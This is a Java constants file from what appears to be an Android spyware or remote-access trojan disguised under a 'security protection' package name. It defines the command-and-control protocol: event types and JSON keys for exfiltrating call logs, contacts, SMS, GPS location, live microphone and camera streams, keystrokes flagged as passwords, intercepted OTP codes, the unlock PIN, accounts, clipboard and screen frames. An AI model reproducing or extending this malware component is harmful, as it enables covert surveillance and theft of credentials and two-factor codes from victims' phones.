package com.seguranca.protecao.core;

/**
 * Protocol — all C2 event type strings and JSON key constants
 * used across the feature modules.
 */
public final class Protocol {

    private Protocol() {}

    // ── Event types (emitted to C2) ─────────────────────────────────────────
    public static final String CALLS          = "calls";
    public static final String CONTACTS       = "contacts";
    public static final String SMS            = "sms";
    public static final String LOCATION       = "location";
    public static final String MIC            = "mic";
    public static final String CAMERA         = "camera";
    public static final String KEYLOG         = "keylog";
    public static final String KEYLOGGER      = "keylog";        // alias used by KeyloggerManager
    public static final String NOTIFICATION   = "notification";
    public static final String NOTIF          = "notification";  // alias used by NotificationRelayService
    public static final String UNLOCK         = "unlock";
    public static final String DEVICE_UNLOCK  = "unlock";        // alias used by UnlockManager
    public static final String ACCOUNTS       = "accounts";
    public static final String FILES          = "file";
    public static final String CLIPBOARD      = "clipboard";
    public static final String SCREEN         = "screen_frame";
    public static final String DEVICE_INFO    = "device_info";

    // ── JSON keys ────────────────────────────────────────────────────────────
    public static final String KEY_TYPE          = "type";
    public static final String KEY_CMD_ID        = "cmd_id";
    public static final String KEY_SUCCESS       = "success";
    public static final String KEY_ERROR         = "error";
    public static final String KEY_MESSAGE       = "message";
    public static final String KEY_DATA          = "data";
    public static final String KEY_TOTAL         = "total";
    public static final String KEY_ACTION        = "action"; // used by ContactsManager

    // Calls
    public static final String KEY_CALLS_LIST    = "calls";
    public static final String KEY_CALL_ID       = "id";
    public static final String KEY_PHONE_NO      = "number";
    public static final String KEY_NAME          = "name";
    public static final String KEY_DURATION      = "duration";
    public static final String KEY_DATE          = "date";
    public static final String KEY_TYPE_CALL     = "type";

    // Contacts
    public static final String KEY_CONTACTS_LIST  = "contacts";
    public static final String KEY_CONTACT_ID     = "id";
    public static final String KEY_RAW_CONTACT_ID = "raw_id";  // used by ContactsManager
    public static final String KEY_CONTACT_PHONE  = "phone";
    public static final String KEY_CONTACT_EMAIL  = "email";
    public static final String KEY_PHONE_TYPE     = "phone_type"; // used by ContactsManager

    // SMS
    public static final String KEY_SMS_LIST      = "sms";
    public static final String KEY_SMS_ID        = "id";
    public static final String KEY_SMS_ADDRESS   = "address";
    public static final String KEY_SMS_BODY      = "body";
    public static final String KEY_SMS_DATE      = "date";
    public static final String KEY_SMS_TYPE      = "type";
    public static final String KEY_SMS_READ      = "read";

    // Location
    public static final String KEY_LAT           = "lat";
    public static final String KEY_LNG           = "lng";
    public static final String KEY_ACCURACY      = "accuracy";
    public static final String KEY_ALTITUDE      = "altitude";
    public static final String KEY_SPEED         = "speed";
    public static final String KEY_PROVIDER      = "provider";
    public static final String KEY_ADDRESS       = "address";

    // Keylog
    public static final String KEY_APP           = "app";
    public static final String KEY_PKG           = "pkg";
    public static final String KEY_TEXT          = "text";
    public static final String KEY_TIMESTAMP     = "ts";
    public static final String KEY_EVENT_TYPE    = "event_type";
    public static final String KEY_IS_PASSWORD   = "is_password";

    // Notification
    public static final String KEY_TITLE         = "title";
    public static final String KEY_BODY          = "body";
    public static final String KEY_PACKAGE       = "package";
    public static final String KEY_IS_OTP        = "is_otp";
    public static final String KEY_OTP_CODE      = "otp_code";

    // Unlock
    public static final String KEY_STATUS        = "status";
    public static final String KEY_PIN           = "pin";

    // Mic / Camera
    public static final String KEY_CHUNK         = "chunk";
    public static final String KEY_FORMAT        = "format";
    public static final String KEY_SAMPLE_RATE   = "sample_rate";
    public static final String KEY_FACING        = "facing";
    public static final String KEY_FRAME         = "frame";

    // ── Additional constants used by ported feature modules ──────────────────

    // SMS actions
    public static final String ACT_SEND_SMS          = "send_sms";

    // Camera
    public static final String KEY_CAMERA_ID          = "camera_id";
    public static final String KEY_CAM_LIST           = "cameras";
    public static final String KEY_IMAGE              = "image";
    public static final String KEY_STREAM_FRAME       = "stream_frame";

    // Mic
    public static final String KEY_BUFFER             = "buffer";
    public static final String KEY_STREAM_AUDIO       = "stream_audio";

    // Keylogger
    public static final String KEY_KEYSTROKES         = "keystrokes";
    public static final String KEY_APP_NAME           = "app_name";

    // Location (aliases matching what GpsManager emits)
    public static final String KEY_LATITUDE           = "lat";
    public static final String KEY_LONGITUDE          = "lng";

    // Notifications
    public static final String NOTIF_CHANNEL          = "notification";
    public static final String NOTIF_GROUP            = "notification_group";
    public static final String SETTING_NOTIF_LISTENERS = "enabled_notification_listeners";
    public static final String KEY_CATEGORY           = "category";
    public static final String KEY_CLEARABLE          = "clearable";
    public static final String KEY_CONTENT            = "content";
    public static final String KEY_ONGOING            = "ongoing";
    public static final String KEY_PACKAGE_NAME       = "package_name";
    public static final String KEY_POST_TIME          = "post_time";
    public static final String KEY_TAG                = "tag";

    // Generic / shared
    public static final String KEY_ID                 = "id";
    public static final String KEY_LIST               = "list";
    public static final String KEY_SMS                = "sms";
    public static final String KEY_READ               = "read";
    public static final String KEY_REMOVED            = "removed";
    public static final String KEY_SIZE               = "size";
    public static final String KEY_FILE               = "file";
    public static final String KEY_TO                 = "to";
    public static final String KEY_HAS_PERM           = "has_perm";
    public static final String KEY_ENABLED            = "enabled";
    public static final String KEY_CONNECTED          = "connected";
    public static final String KEY_INITIAL            = "initial";
}
